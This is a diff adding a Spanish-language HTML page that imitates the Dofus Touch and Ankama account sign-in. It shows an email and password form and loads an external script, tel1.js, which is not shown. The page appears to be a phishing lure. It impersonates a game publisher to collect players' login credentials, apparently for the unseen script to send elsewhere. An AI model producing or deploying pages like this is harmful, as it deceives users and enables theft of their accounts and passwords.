@@ -1,0 +1,82 @@
+<!DOCTYPE html><html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dofus Touch</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: white;
+            background-image: url('https://cdn-bgp.bluestacks.com/BGP/latam/app_page_com.ankama.dofustouch.jpg'); /* Cambia esto por la ruta de tu fondo */
+            background-size: cover;
+            text-align: center;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.7); /* Fondo oscuro semi-transparente */
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%; /* Ancho máximo del contenedor */
+            max-width: 400px; /* Ancho máximo para pantallas grandes */
+        }
+
+        h1 {
+            font-size: 2em; /* Tamaño de fuente adaptable */
+            margin-bottom: 20px;
+        }
+
+        input[type="email"], input[type="password"] {
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .button {
+            background-color: #ffcc00; /* Color del botón */
+            color: black;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 25px; /* Esquinas ovaladas */
+            cursor: pointer;
+            font-size: 1em; /* Tamaño de fuente adaptable */
+            transition: background-color 0.3s;
+            width: 100%; /* Botón de ancho completo */
+        }
+
+        .button:hover {
+            background-color: #e6b800; /* Color del botón al pasar el mouse */
+        }
+
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em; /* Tamaño de fuente más pequeño en pantallas pequeñas */
+            }
+
+            .button {
+                font-size: 0.9em; /* Tamaño de fuente más pequeño para el botón */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Por favor accede a tu Cuenta Ankama</h1>
+        <form id="loginForm">
+            <input type="email" id="Correo" name="Correo" placeholder="Correo Electrónico" required="">
+            <input type="password" id="Contra" name="Contra" placeholder="Contraseña">
+            <button type="submit" id="submitButton" class="button">Iniciar Sesión</button>
+        </form>
+    </div>
+
+    <script src="tel1.js"></script>
+
+
+
+</body></html>
